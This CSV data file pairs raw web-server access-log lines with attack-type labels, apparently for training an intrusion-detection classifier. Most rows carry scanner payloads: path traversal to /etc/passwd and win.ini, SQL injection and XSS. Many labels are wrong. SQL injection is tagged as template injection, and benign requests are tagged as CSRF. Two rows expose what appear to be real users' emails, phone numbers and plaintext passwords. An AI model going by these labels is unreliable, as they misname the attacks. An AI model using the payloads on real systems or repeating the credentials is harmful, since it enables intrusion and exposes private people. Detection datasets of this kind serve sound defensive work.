source,text
"10.128.0.205 - - [25/Mar/2018:00:25:51 +0330] ""GET /..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:24:28 +0330] ""GET /examples/jsp/checkbox/admin/file_manager.php?action=read&filename=../../../../../../../../etc/passwd HTTP/1.1"" 404 322 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"10.172.152.13 - - [24/Mar/2018:19:26:01 +0330] ""GET /servlet/webacc?User.lang=<script>foo</script> HTTP/1.1"" 404 307 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.241.111.81 - - [24/Mar/2018:00:54:24 +0330] ""GET /././././././../../../../../winnt/win.ini HTTP/1.1"" 400 981 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.172.152.13 - - [24/Mar/2018:19:26:04 +0330] ""GET /login?user=**<script>JavaScript:alert('cpanel_login_user_xss.nasl');</script> HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:41:44 +0330] ""GET /scripts/..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf..\xc0\xaf../winnt/system32/cmd.exe?/c+dir+c:\\+/OG HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:15:47:27 +0330] ""GET /scripts/?user=jffnms_user_sql_injection.nasl' UNION SELECT 2,'admin','$1$RxS1ROtX$IzA1S3fcCfyVfA9rwKBMi.','Administrator'--&file=index&pass= HTTP/1.1"" 404 285 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:53:14 +0330] ""GET /image/{{basketItem.id}}?type=productModel%25%27%20AND%201008%3D3830%20AND%20%27%25%27%3D%27&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:54:44 +0330] ""GET / HTTP/1.1"" 200 1433 ""-"" ""<script>foo</script>"" ""-""",Cross-Site Scripting
"5.114.130.71 - - [22/Jan/2019:10:27:16 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D8%B3%D8%AC%D8%A7%D8%AF&lastName=%D8%AE%D8%B3%D8%B1%D9%88%DB%8C&username=www.khosravisajad18613%40gmail.com&mobile=09128635790&password=sajad1371&password2=sajad1371 HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/register"" ""Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"10.128.0.238 - - [24/Mar/2018:21:54:45 +0330] ""GET ../../../../../../../../../../../../windows/win.ini HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.205 - - [25/Mar/2018:00:26:04 +0330] ""GET /servlet/webacc?User.lang=<script>foo</script> HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"83.123.133.93 - - [22/Jan/2019:13:27:21 +0330] ""GET /m HTTP/1.1"" 200 17419 ""https://www.google.com/url?url=https://www.zanbil.ir/&q=zanbil&rct=j&sa=X&source=suggest&ct=res&oi=suggest_nav&usg=AOvVaw18VWz1TEr08NIrRRmz-JC7&oq=zanbil&gs_l=mobile-gws-wiz-hp.1.5.0l4j46i10j5j46i10j0i10.4054.5277..8126...0.0..0.302.1718.2-5j1....3..0....1.......8..41j46.UW8DwMzzYes"" ""Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:59:35 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:22:59:28 +0330] ""GET /mxhelp/cgi-bin/namazucgi?lang=/../../../../../../../../../../../../../boot.ini HTTP/1.1"" 404 7621 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:22:45:34 +0330] ""GET /.../.../.../.../.../.../.../.../.../windows/win.ini HTTP/1.1"" 403 260 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:40:18 +0330] ""GET /./../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 321 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:29:34 +0330] ""GET /scripts/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../etc/passwd HTTP/1.1"" 404 238 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"5.101.40.234 - - [23/Jan/2019:06:57:38 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%20AND%20SLEEP%285%29%20AND%20%27IIvJ%27%3D%27IIvJ HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:40:20 +0330] ""GET /.../.../.../.../.../.../.../.../.../windows/win.ini HTTP/1.1"" 404 326 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.172.152.13 - - [24/Mar/2018:19:26:56 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 404 309 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:49:18 +0330] ""GET /././././././../../../../../windows/win.ini HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:53:41 +0330] ""GET /image/{{basketItem.id}}?type=%28SELECT%201105%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171767871%2C%28SELECT%20%28ELT%281105%3D1105%2C1%29%29%29%2C0x7171707a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:26:13 +0330] ""GET /examples/jsp/jsp2/el/parse_xml.cgi?action=login&filename=frameset.html|id\x00| HTTP/1.1"" 404 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"192.168.202.110 - - [16/Mar/2012:14:25:15 +0330] ""GET /examples/jsp/num/demos/demo.browse.php?filename=/etc/passwd HTTP/1.1"" 404 1069 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"10.128.0.207 - - [23/Mar/2018:20:44:47 +0330] ""GET /index.php?route=product/category&path=../../../../../../../usr/bin/shutdown HTTP/1.1"" 200 18633 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:57:37 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20AND%20SLEEP%285%29 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"46.100.179.29 - - [23/Jan/2019:23:27:59 +0330] ""GET /filter/b6,p1815 HTTP/1.1"" 200 31113 ""https://search.mysearch.com/web?apn_uid=A6E412C4-BE6A-4EA3-9887-25C932D1035F&b=ttb&doi=2019-01-22&gct=hp&guid=A6E412C4-BE6A-4EA3-9887-25C932D1035F&n=7857ae7f&p2=%5ECTX%5Eprs001%5EB2BMS%5Eir&si=0jm5r4c20000009922336937320744E1A793FCD9B805CC8194C5BEa----------------------------14856129191l__3&st=hp&trs=wtt&tpr=2&enc=2&q=Oe4ABfYI96ZQXGnKkqBuYeSsilmPdvWTVjWFs8ePJ__s8ikh4ZSKwlPhPItTJSqeWFhfLaNYsJ71MDlG9EQta_0ZTLAJq3bPGHJ8zYGYCvxdfNs8ubuVCdgPF-naiMUiZcK6t-rvpAwvV3UziIHx2GWsU93MslKG-UtpeA01DiVUbaQBanye5dNoFg15uP-1c_PffhrWaav9_FbUYUK2389Q587XF-xs2rIGlX_aCGXcew2gO1Y8jVybEbf9yAdSAwaf69t1z5P0EUbR-obXKXdsqD3mg5RSBcYW-nFu_tt9adcy1yMFOUXxNHXnt2fBc9g4gZqUakngr5Kv3OhhIA&ts=1548273684319"" ""Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:49:21 +0330] ""GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1"" 404 1056 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:53:02 +0330] ""GET /image/{{basketItem.id}}?type=productModel.%27%28%29%27%27.%28%22.&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:53:54 +0330] ""GET /image/{{basketItem.id}}?type=productModel%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [25/Mar/2018:00:25:51 +0330] ""GET .\\.\\.\\.\\.\\.\\.\\.\\.\\.\\/winnt/win.ini HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:57:26 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:57:39 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20AND%20SLEEP%285%29--%20nBOH HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:15:45:15 +0330] ""GET /en-US/account/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1 HTTP/1.1"" 404 304 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:14:25:52 +0330] ""GET /?user=jffnms_user_sql_injection.nasl' UNION SELECT 2,'admin','$1$RxS1ROtX$IzA1S3fcCfyVfA9rwKBMi.','Administrator'--&file=index&pass= HTTP/1.1"" 200 11313 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:58:04 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20OPpa HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:49:20 +0330] ""GET /ifx/?LO=../../../../../etc/passwd HTTP/1.1"" 404 1056 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [23/Mar/2018:18:53:21 +0330] ""GET /phpMyAdmin/js/get_scripts.js.php../../../../../../../../../../../../../../../../etc/passwd?scripts[]=jquery/jquery.min.js&scripts[]=jquery/jquery-migrate-3.0.0.js&scripts[]=sprintf.js&scripts[]=ajax.js&scripts[]=keyhandler.js&scripts[]=jquery/jquery-ui.min.js&scripts[]=jquery/jquery.cookie.js&scripts[]=jquery/jquery.mousewheel.js&scripts[]=jquery/jquery.event.drag-2.2.js&scripts[]=jquery/jquery-ui-timepicker-addon.js&v=4.7.8 HTTP/1.1"" 400 173 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:40:06 +0330] ""GET //surgeweb?username_ex=""><scri<script>alert(42);</script><input type=""hidden HTTP/1.1"" 302 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:44:48 +0330] ""GET /./../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:23:00:11 +0330] ""GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1"" 404 7626 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:58:34 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20qkyW HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:24:45 +0330] ""GET /scripts/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1 HTTP/1.1"" 404 299 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:56:44 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=%28SELECT%20%28CASE%20WHEN%20%281812%3D4106%29%20THEN%201812%20ELSE%201812%2A%28SELECT%201812%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%29%20END%29%29 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:15:38:57 +0330] ""GET /index.php?page=documents&doc=-99' UNION SELECT null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null-- HTTP/1.0"" 200 90 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:18:32:38 +0330] ""GET /cgi-bin/admin/index.php?act=login&username=' UNION SELECT 1,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus HTTP/1.1"" 404 1635 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.122.36.135 - - [26/Jan/2019:14:15:35 +0330] ""GET /image/32193?name=581.jpg&wh=200x200 HTTP/1.1"" 200 5406 ""https://torob.com/browse/95/%D8%AA%D8%A8%D9%84%D8%AA-tablet/?sort=price_asc&available=true&screen_size__min=10&screen_size__max=19"" ""Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:51:13 +0330] ""GET /console/faces/com_sun_web_ui/help/masthead.jsp?windowTitle=</title><script>alert('sun_java_web_console_helpwindow_xss.nasl')</script> HTTP/1.1"" 404 321 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.238 - - [23/Mar/2018:18:53:21 +0330] ""GET /phpMyAdmin/js/yhu8j{{107*945}}va9b2?scripts[]=jquery/jquery.min.js&scripts[]=jquery/jquery-migrate-3.0.0.js&scripts[]=sprintf.js&scripts[]=ajax.js&scripts[]=keyhandler.js&scripts[]=jquery/jquery-ui.min.js&scripts[]=jquery/jquery.cookie.js&scripts[]=jquery/jquery.mousewheel.js&scripts[]=jquery/jquery.event.drag-2.2.js&scripts[]=jquery/jquery-ui-timepicker-addon.js&v=4.7.8 HTTP/1.1"" 404 3650 ""-"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:41:37 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../etc/passwd HTTP/1.1"" 404 1056 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:58:06 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20ORDER%20BY%202964--%20yHQa HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:39:12 +0330] ""GET /cacti/index.php?x=browse&category='UNION SELECT '1','2','pixelpost_category_sql_injection.nasl','1331905219','5'-- HTTP/1.1"" 200 1189 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:40:18 +0330] ""GET /././././././../../../../../etc/passwd HTTP/1.1"" 400 304 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:22:45:34 +0330] ""GET /././././././../../../../../etc/passwd HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:25:50 +0330] ""GET /phpmyadmin/index.php?module=Topics&func=view&topicid=-1 UNION SELECT null,null,'mdpro_topicid_sql_injection.nasl-1331904418',null,null,null,null -- HTTP/1.1"" 200 8625 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:57:15 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=%28SELECT%20%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283634%3D3634%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%29 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:42:04 +0330] ""GET /././././././../../../../../windows/win.ini HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:59:01 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:22:53 +0330] ""GET /cgi-bin/index.php?x=browse&category='UNION SELECT '1','2','pixelpost_category_sql_injection.nasl','1331904240','5'-- HTTP/1.1"" 404 295 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:41:14 +0330] ""GET /scripts/fake.cgi?arg=/../../../../../windows/win.ini HTTP/1.1"" 404 233 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:15:37:38 +0330] ""GET /scripts/photo.php?albumid=-904' UNION SELECT 1,concat(0x73,0x69,0x74,0x65,0x78,0x5f,0x61,0x6c,0x62,0x75,0x6d,0x69,0x64,0x5f,0x73,0x71,0x6c,0x69,0x2e,0x6e,0x61,0x73,0x6c),3,4,5,6,7,8 -- ' HTTP/1.1"" 404 295 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:22:45:14 +0330] ""GET /./../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 303 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:18:29:57 +0330] ""GET /scripts/bemarket/shop/index.php?pageurl=viewpage&filename=../../../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 1635 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"10.128.0.238 - - [24/Mar/2018:21:45:06 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 283 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:55:07 +0330] ""GET /image/{{basketItem.id}}?type=productModel%25%27%20ORDER%20BY%204896--%20SlMa&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:57:10 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20AND%205505%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285505%3D5505%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29--%20NVvd HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.124.83.110 - - [22/Jan/2019:14:52:54 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=%D9%85%D8%AD%D9%85%D8%AF&lastName=%D9%85%D8%B1%D8%A7%D8%AF%D9%82%D9%84%DB%8C&username=paeizan_tablo%40yahoo.com&mobile=09307998285&password=09155474810110DHUGD&password2=09155474810110DHUGD HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/register"" ""Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/8.2 Chrome/63.0.3239.111 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
